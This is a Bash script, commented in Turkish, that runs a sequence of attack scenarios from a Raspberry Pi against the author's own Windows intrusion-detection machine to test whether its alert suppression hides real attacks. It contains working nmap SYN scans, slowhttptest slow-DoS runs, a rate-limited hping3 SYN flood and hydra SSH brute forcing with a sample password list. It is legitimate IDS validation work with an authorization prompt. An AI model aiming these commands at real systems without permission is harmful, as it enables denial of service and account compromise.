#!/usr/bin/env bash
# ============================================================================
#  03_pi_attack_scenarios.sh  --  Raspberry Pi SALDIRGAN senaryolari
# ============================================================================
#  YETKI: SADECE kullaniciya ait, ayni yerel LAN'daki Windows IDS makinesine
#  karsi, kontrollu/yetkilendirilmis dogrulama testi icindir. Baska bir hedefe
#  YONELTMEYIN.
#
#  Bu script planlanan (ve iki uzman agent tarafindan denetlenmis) senaryolari
#  AYRI fonksiyonlar olarak calistirir; her fonksiyon bir banner basar ve
#  aralarinda Enter beklenir -- boylece dashboard/Mongo'da her saldiri ayirt
#  edilebilir. Tum saldirilar HIZ-SINIRLI/kisa surelidir (hping3 asla --flood).
#
#  Kaynak plan: project_live_attack_test_plan_raspberry_pi.md (senaryo tablosu)
#  Denetim bulgulari: F1 (dar-bant nmap), F2 (yavas hydra), F3 (hping3),
#                     F4 (-c150 slowhttptest).
# ============================================================================

set -u

# ============================================================================
#  DUZENLENEBILIR DEGISKENLER  (yalnizca burayi degistir)
# ============================================================================
TARGET_IP="192.168.1.100"          # <-- Windows IDS makinesinin LAN IP'si (01_windows_setup.ps1 basar)
HTTP_PORT="8080"                   # http.server hedef portu
SSH_PORT="22"                      # OpenSSH hedef portu (hydra)
TEST_USER="testuser"               # hydra icin ATILABILIR/test hesabi (gercek hesap DEGIL)
WORDLIST_PATH="./wordlist.txt"     # hydra parola listesi (yoksa asagida kucuk ornek uretilir)

# --- nmap ---
NMAP_FULL_PORTS="1-1000"           # temel PortScan (>> 150 esik -> guvenle alarm)
NMAP_NARROW_PORTS="1-100"          # F1: dar-bant (40-149 araligi -> scan_rf_benign vetosunu sinar)

# --- slowhttptest ---
SLOW_CONN_HIGH="1000"              # temel: conn_flood esigini (200) asar -> VOLUMETRIK
SLOW_CONN_LOW="150"                # F4: esigin ALTINDA -> LSTM/davranissal dala duser
SLOW_RATE="200"                    # baglanti/sn ramp
SLOW_DURATION="60"                 # -l saniye (kisa tutuldu)

# --- hping3 (KESINLIKLE --flood YOK) ---
HPING_COUNT="3000"                 # toplam SYN paketi
HPING_INTERVAL="u1000"             # paket araligi (u1000 = 1ms ~ 1000 pkt/s), hiz-sinirli

# --- hydra ---
HYDRA_FAST_THREADS="16"            # hizli: 60sn'de >=150 SYN -> VOLUMETRIK dal
HYDRA_SLOW_THREADS="4"             # F2 (EN ONEMLI): yavas -> LSTM dali, FP-bastiricilara acik
# ============================================================================

# ----- Yardimci: renkli banner ----------------------------------------------
banner() {
    echo ""
    echo "============================================================"
    echo " $1"
    echo "============================================================"
}

pause() {
    echo ""
    read -r -p ">>> Devam etmek icin Enter'a bas (atlamak icin Ctrl+C)... " _
}

confirm_target() {
    echo "HEDEF        : $TARGET_IP  (HTTP:$HTTP_PORT  SSH:$SSH_PORT)"
    echo "TEST_USER    : $TEST_USER"
    echo "WORDLIST     : $WORDLIST_PATH"
    read -r -p ">>> Bu hedef DOGRU ve sana ait mi? Onaylamak icin 'evet' yaz: " ans
    if [ "$ans" != "evet" ]; then
        echo "Iptal edildi."
        exit 1
    fi
}

# ----- Arac kurulum kontrolu ------------------------------------------------
ensure_tools() {
    banner "ARAC KURULUM KONTROLU (hping3 / slowhttptest / nmap / hydra)"
    local missing=()
    for t in hping3 slowhttptest nmap hydra; do
        if ! command -v "$t" >/dev/null 2>&1; then
            missing+=("$t")
        fi
    done
    if [ "${#missing[@]}" -eq 0 ]; then
        echo "[OK] Tum araclar kurulu."
    else
        echo "[!] Eksik arac(lar): ${missing[*]}"
        echo "    Kurmak icin (sudo gerekir):"
        echo "    sudo apt update && sudo apt install -y ${missing[*]}"
        read -r -p ">>> Simdi kurmayi denemek ister misin? (e/h): " k
        if [ "$k" = "e" ]; then
            sudo apt update && sudo apt install -y "${missing[@]}"
        else
            echo "    Kurulum atlandi -- eksik araci gerektiren senaryolar basarisiz olabilir."
        fi
    fi

    # Wordlist yoksa hydra senaryolari icin kucuk bir ornek uret (yalnizca test).
    if [ ! -f "$WORDLIST_PATH" ]; then
        echo "[i] Wordlist ($WORDLIST_PATH) bulunamadi -- kucuk bir TEST listesi olusturuluyor."
        printf '123456\npassword\nadmin\nroot\ntoor\nletmein\nqwerty\ntest123\nP@ssw0rd\nraspberry\n' > "$WORDLIST_PATH"
        echo "    [OK] Ornek wordlist yazildi: $WORDLIST_PATH"
    fi
}

# ============================================================================
#  SENARYO 1 -- PortScan (temel)
# ============================================================================
scenario_portscan_full() {
    banner "SENARYO 1: PortScan (temel) -- nmap -sS -T4 -p $NMAP_FULL_PORTS"
    echo "Ne test ediliyor: 1000 port >> scan_rf_benign vetosunun 150-port esigi."
    echo "Beklenti: is_scan tetiklenir, PortScan alarmi GUVENLE doner (bastirilmaz)."
    echo "Not: kapali portlar DROP degil RST/REJECT donmeli (Windows FW ayarina bak)."
    pause
    sudo nmap -sS -T4 -p "$NMAP_FULL_PORTS" "$TARGET_IP"
}

# ============================================================================
#  SENARYO 2 -- PortScan (dar-bant, F1)
# ============================================================================
scenario_portscan_narrow() {
    banner "SENARYO 2: PortScan (dar-bant / F1) -- nmap -sS -T4 -p $NMAP_NARROW_PORTS"
    echo "Ne test ediliyor: KASITLI 40-149 port araligi -> scan_rf_benign vetosu"
    echo "GERCEK bir taramayi yanlislikla bastirir mi? (Mongo'da suppressed_by="
    echo "'scan_rf_benign' + status!=ATTACK gorursen = FP-fix gercek saldiriyi yedi)."
    pause
    sudo nmap -sS -T4 -p "$NMAP_NARROW_PORTS" "$TARGET_IP"
}

# ============================================================================
#  SENARYO 3 -- Slowloris/Slowhttptest (temel, volumetrik)
# ============================================================================
scenario_slow_high() {
    banner "SENARYO 3: Slowhttptest (temel) -- -c $SLOW_CONN_HIGH (conn_flood > 200)"
    echo "Ne test ediliyor: yuksek eszamanli baglanti -> VOLUMETRIK 'Baglanti Seli'"
    echo "imzasi. Net alarm beklenir; LSTM/R21-IAT yolunu TEST ETMEZ (F4 icin S4)."
    pause
    slowhttptest -c "$SLOW_CONN_HIGH" -H -g -o slow_high_out -i 10 -r "$SLOW_RATE" \
        -t GET -u "http://$TARGET_IP:$HTTP_PORT/" -x 24 -p 3 -l "$SLOW_DURATION"
}

# ============================================================================
#  SENARYO 4 -- Slow-DoS (davranissal, F4)  -- ESAS test
# ============================================================================
scenario_slow_low() {
    banner "SENARYO 4: Slow-DoS (davranissal / F4) -- -c $SLOW_CONN_LOW (< conn_flood 200)"
    echo "Ne test ediliyor: eszamanli baglanti conn_flood ESIGININ ALTINDA -> akis"
    echo "LSTM/davranissal dala duser. R21 IAT-kapisi / immature-clamp / konsey"
    echo "vetosu GERCEK yavas-DoS'u yanlislikla bastiriyor mu? (asil FP-bastirma testi)"
    pause
    slowhttptest -c "$SLOW_CONN_LOW" -H -g -o slow_low_out -i 10 -r "$SLOW_RATE" \
        -t GET -u "http://$TARGET_IP:$HTTP_PORT/" -x 24 -p 3 -l "$SLOW_DURATION"
}

# ============================================================================
#  SENARYO 5 -- hping3 rate-limited SYN DoS (F3)
# ============================================================================
scenario_hping_dos() {
    banner "SENARYO 5: hping3 SYN DoS (rate-limited / F3) -- -i $HPING_INTERVAL -c $HPING_COUNT"
    echo "Ne test ediliyor: sabit dst-port SYN akini -> tek volumetrik anahtarda"
    echo "toplanir, syn>=150 <0.15sn'de VOLUMETRIK alarm. GUVENCE senaryosu."
    echo "DIKKAT: --flood YOK, hiz $HPING_INTERVAL ile sinirli."
    pause
    sudo hping3 -S -p "$HTTP_PORT" -i "$HPING_INTERVAL" -c "$HPING_COUNT" "$TARGET_IP"
}

# ============================================================================
#  SENARYO 6 -- hydra SSH-Patator (hizli, -t16)
# ============================================================================
scenario_hydra_fast() {
    banner "SENARYO 6: SSH-Patator (hizli / -t$HYDRA_FAST_THREADS)"
    echo "Ne test ediliyor: yuksek paralellik -> 60sn'de >=150 SYN -> VOLUMETRIK dal."
    echo "Alarm beklenir (etiket 'SYN-Flood' olabilir; tespit dogru, atfetme quirk)."
    echo "Hedef ATILABILIR '$TEST_USER' hesabi -- gercek hesap DEGIL."
    pause
    hydra -l "$TEST_USER" -P "$WORDLIST_PATH" -t "$HYDRA_FAST_THREADS" -f -V \
        "ssh://$TARGET_IP:$SSH_PORT"
}

# ============================================================================
#  SENARYO 7 -- hydra SSH-Patator (yavas, -t4, F2)  -- EN ONEMLI varyant
# ============================================================================
scenario_hydra_slow() {
    banner "SENARYO 7: SSH-Patator (yavas / -t$HYDRA_SLOW_THREADS / F2) -- EN ONEMLI"
    echo "Ne test ediliyor: az paralel -> kisa SSH akislari LSTM dalina duser;"
    echo "immature-clamp + R26 konsey-vetosu + OOD kapisina maruz kalir. CICIDS-disi"
    echo "gercek hydra trafiginde HIC test edilmedi. Mongo'da suppressed_by ="
    echo "{committee_dissent|ood|immature_flow} + status!=ATTACK = gercek saldiri"
    echo "yanlislikla bastirilmis demektir (testin asil hedefi)."
    pause
    hydra -l "$TEST_USER" -P "$WORDLIST_PATH" -t "$HYDRA_SLOW_THREADS" -f -V \
        "ssh://$TARGET_IP:$SSH_PORT"
}

# ============================================================================
#  ANA AKIS
# ============================================================================
main() {
    banner "RASPBERRY PI CANLI-ATES SALDIRI SENARYOLARI"
    confirm_target
    ensure_tools

    echo ""
    echo "Senaryolar TEK TEK, aralarinda Enter beklenerek calisacak."
    echo "Her senaryo sonrasi ~10-15sn bekleyip Windows'ta 04_mongo_analysis.py"
    echo "ile o zaman araligini incelemen onerilir (pencere ayrimini kolaylastirir)."
    pause

    scenario_portscan_full
    pause
    scenario_portscan_narrow
    pause
    scenario_slow_high
    pause
    scenario_slow_low
    pause
    scenario_hping_dos
    pause
    scenario_hydra_fast
    pause
    scenario_hydra_slow

    banner "TUM SENARYOLAR TAMAMLANDI"
    echo "Windows'ta: 04_mongo_analysis.py --start <baslangic> --end <bitis>"
    echo "Sonra: 02_windows_cleanup.ps1"
}

main "$@"
